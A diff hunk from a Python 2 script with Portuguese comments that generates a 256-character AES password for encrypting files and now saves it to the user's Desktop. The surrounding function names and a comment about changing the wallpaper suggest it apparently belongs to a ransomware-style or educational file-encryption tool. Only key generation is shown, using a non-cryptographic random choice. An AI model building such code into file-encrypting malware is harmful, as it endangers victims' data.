@@ -53,21 +53,22 @@ def listar(chave_AES,diretorio, tipos_arq):
 
 
 # GERA SENHA AES que vai criptografar os arquivos
-# Salva senha em arquivo.txt
 def gera_chave_AES():
-    tamanho=256 # bytes
+    caminho = os.environ['HOME']+'/Desktop/'
+    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    if(os.path.isdir(caminho)):
+        caminho_correto = caminho
+    elif(os.path.isdir(caminho2)):
+        caminho_correto = caminho2
+        
+    tamanho = 256 # bytes
     caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
     senha = ''
     for char in xrange(tamanho):
         senha += choice(caracters)
 
-    try:
-        f = open('keys/AES.txt','w')
-    except IOError:
-        os.mkdir('keys')
-        f = open('keys/AES.txt','w')
-    f.write(senha)
-    f.close()
+    with open(caminho_correto + 'AES.txt','w') as f:
+        f.write(senha)
     return senha
 
 # função que troca o plano de fundo do compiuter
